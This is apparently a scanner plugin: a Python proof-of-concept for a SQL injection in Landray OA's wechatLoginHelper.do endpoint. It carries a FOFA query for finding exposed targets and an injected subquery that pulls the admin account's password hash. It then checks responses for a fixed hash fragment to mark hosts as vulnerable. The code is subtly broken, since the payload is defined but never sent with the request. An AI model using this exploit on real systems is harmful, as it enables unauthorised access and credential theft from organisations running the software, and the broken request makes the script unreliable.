#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/vwJjmb_Im6Z7-2EVSfY5-g',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '蓝凌OA wechatLoginHelper存在SQL注入',

      'level'     :   'high',

      'FOFA'      :   'app="Landray-OA系统"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/29',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept-Encoding': 'gzip, deflate',
      'Accept': '*/*',
      'Connection': 'close',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': '147',
      }
  data = r'''
  method=edit&uid=1'and+(SELECT+fdPassword%2B'----'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin')=1+and+'1'='1
  '''
  target = '/third/wechat/wechatLoginHelper.do'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,timeout=7,verify=False)
    if res.status_code == 200 and re.search(r'85646ac7f50864f',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret